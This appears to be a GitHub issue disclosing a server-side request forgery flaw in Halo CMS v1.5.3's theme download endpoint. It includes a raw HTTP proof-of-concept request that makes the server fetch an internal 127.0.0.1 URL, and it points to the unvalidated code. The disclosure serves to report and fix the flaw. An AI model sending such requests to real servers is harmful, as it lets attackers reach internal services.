| <https://github.com/halo-dev/halo/>  There is an ssrf vulnerability in the template remote download function in halo cms v1.5.3. The attacker needs to enter a link that ends with a zip , such as <http://127.0.0.1:40001/1.zip> Proof of Concept ``` POST /api/admin/themes/fetching?uri=http://127.0.0.1:40000/1.zip HTTP/1.1 Host: 127.0.0.1:8090 Content-Length: 2 Admin-Authorization: 244a0b5340d943ffb8be55bbf3c0db2f Accept: application/json, text/plain, */* User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Content-Type: application/json Origin: http://127.0.0.1:8090 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://127.0.0.1:8090/admin/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=node08slatpind75xksvtriiymt214.node0 Connection: close  {  ```  [image](https://user-images.githubusercontent.com/34082644/172118182-06e1a237-82b8-402e-ba8c-23437e648f5d.png) [image](https://user-images.githubusercontent.com/34082644/172117731-a7d22fb1-4775-47b9-a053-c82804acc27e.png)  [permalink: ZipThemeFetcher.java#L43](https://github.com/halo-dev/halo/blob/352d9d4e2002b3bf8ffa5dfd956c228341519a45/src/main/java/run/halo/app/theme/ZipThemeFetcher.java#L43) The destination address is not limited in the code, so it can cause ssrf vulnerability [image](https://user-images.githubusercontent.com/34082644/172117947-a40e0bf7-2cca-4b50-b7f6-19d908da6996.png) |
